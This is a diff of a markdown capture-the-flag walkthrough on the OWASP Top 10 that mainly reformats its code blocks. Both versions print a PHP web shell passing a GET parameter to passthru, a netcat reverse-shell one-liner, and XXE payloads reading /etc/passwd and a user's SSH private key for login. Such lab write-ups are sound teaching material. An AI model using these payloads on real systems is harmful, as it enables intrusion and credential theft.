@@ -49,13 +49,13 @@ In the url `http://<ip>/evilshell.php`, use the below command to spawn a reverse
 {% capture code %}{% raw %}mkfifo /tmp/p ; nc <remote-ip> 4444 0</tmp/p | /bin/sh -i 2>&1 | tee /tmp/p{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 The sample php shell code from `evilshell.php` is as below.
-{% capture nvar %}{% raw %}<?php
-    if (isset($_GET["commandString"])) {
-        $command_string = $_GET["commandString"];
-        try { passthru($command_string); }
-        catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
-    }
-?>{% endraw %}{% endcapture %} {% assign nvar = nvar | markdownify %} {% include code.html code=nvar %}
+{% capture code %}{% raw %}    <?php
+        if (isset($_GET["commandString"])) {
+            $command_string = $_GET["commandString"];
+            try { passthru($command_string); }
+            catch (Error $error) { echo "<p class=mt-3><b>$error</b></p>"; }
+        }
+    ?>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 
@@ -63,15 +63,15 @@ To read motd data in ubuntu, use the file `cat /etc/update-motd.d/00-header`.
 ## Task 6 - [Severity 2] Broken Authentication
 
 Authentication flaw types.
-  - Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
-  - Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such as‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without bruteforcing and without multiple attempts.
-  - Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.
+- Brute force attacks: If a web application uses usernames and passwords, an attacker is able to launch brute force attacks that allow them to guess the username and passwords using multiple authentication attempts.
+- Use of weak credentials: web applications should set strong password policies. If applications allow users to set passwords such a ‘password1’ or common passwords, then an attacker is able to easily guess them and access user accounts. They can do this without brute-forcing and without multiple attempts.
+- Weak Session Cookies: Session cookies are how the server keeps track of users. If session cookies contain predictable values, an attacker can set their own session cookies and access users’ accounts.
 
 
 ## Task 7 - [Severity 2] Broken Authentication Practical
 
 Re-registration of an existing user.
-  - Upon trying to register a username with existing username and a space prepended, website will allow for user registration and will provide same privilege as the user during login.
+- Upon trying to register a username with existing username and a space prepended, website will allow for user registration and will provide same privilege as the user during login.
 
 
 ## Task 11 - [Severity 3] Sensitive Data Exposure (Challenge)
@@ -158,24 +158,24 @@ Example DTD file `note.dtd`.
 {% raw %}<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>{% endraw %}
 
 The type of elements in `note.dtd` file is as below.
-{% capture code %}{% raw %}!DOCTYPE note -  Defines a root element of the document named note
-!ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
-!ELEMENT to - Defines the to element to be of type "#PCDATA"
-!ELEMENT from - Defines the from element to be of type "#PCDATA"
-!ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
-!ELEMENT body - Defines the body element to be of type "#PCDATA"
-!ENTITY - Defines new entity to be used as shortcut in XML file
-#PCDATA - Parseable Character DATA{% endraw %}{% endcapture %} {% include code.html code=code %}
+- !DOCTYPE note -  Defines a root element of the document named note
+- !ELEMENT note - Defines that the note element must contain the elements: "to, from, heading, body"
+- !ELEMENT to - Defines the to element to be of type "#PCDATA"
+- !ELEMENT from - Defines the from element to be of type "#PCDATA"
+- !ELEMENT heading  - Defines the heading element to be of type "#PCDATA"
+- !ELEMENT body - Defines the body element to be of type "#PCDATA"
+- !ENTITY - Defines new entity to be used as shortcut in XML file
+- #PCDATA - Parseable Character DATA
 
 Example `note.xml` file referring to `note.dtd`.
-{% capture code %}{% raw %}<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE note SYSTEM "note.dtd">
-<note>
-    <to>falcon</to>
-    <from>feast</from>
-    <heading>hacking</heading>
-    <body>XXE attack</body>
-</note>{% endraw %}{% endcapture %} {% include code.html code=code lang="xml" highlighter="syntax" %}
+{% capture code %}{% raw %}   <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE note SYSTEM "note.dtd">
+    <note>
+        <to>falcon</to>
+        <from>feast</from>
+        <heading>hacking</heading>
+        <body>XXE attack</body>
+    </note>{% endraw %}{% endcapture %} {% include code.html code=code %}
 
 
 ## Task 15 - [Severity 4] XML External Entity - XXE Payload
@@ -195,14 +195,14 @@ Nmap done: 1 IP address (1 host up) scanned in 1.90 seconds{% endraw %}{% endcap
 
 Use `firefox` to load url `http://<ip>` and try the below payloads.
 
-{% capture code %}<!DOCTYPE replace [<!ENTITY name "feast"> ]>
-    <userInfo>
-        <firstName>falcon</firstName>
-        <lastName>&amp;name;</lastName>
-    </userInfo>{% endcapture %} {% include code.html code=code lang="xml"%}
+{% capture code %}    <!DOCTYPE replace [<!ENTITY name "feast"> ]>
+        <userInfo>
+            <firstName>falcon</firstName>
+            <lastName>&amp;name;</lastName>
+        </userInfo>{% endcapture %} {% include code.html code=code%}
 
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code%}
 
 The first payload will display `falcon feast` and the second payload will display contents of system file `/etc/passwd`.
 
@@ -213,11 +213,11 @@ Use `firefox` to load the url `http://<ip>`
 
 Use the following payloads to get the contents of `/etc/passwd`.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code%}
 
 There is one non-system user. Use the following payload to read the user's rsa private key.
 {% capture code %}<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/<user>/.ssh/id_rsa'>]>
-<root>&amp;read;</root>{% endcapture %} {% include code.html code=code lang="xml"%}
+<root>&amp;read;</root>{% endcapture %} {% include code.html code=code%}
 
 Copy the contents of payload output to new file. Change the permission of the file to be more stricter, like `chmod 400 <user>_id_rsa` and use `ssh` to login to the machine using downloaded user's ssh private key.
 {% capture code %}{% raw %}ssh -i <user>_id_rsa <user>@<ip>{% endraw %}{% endcapture %} {% include code.html code=code %}
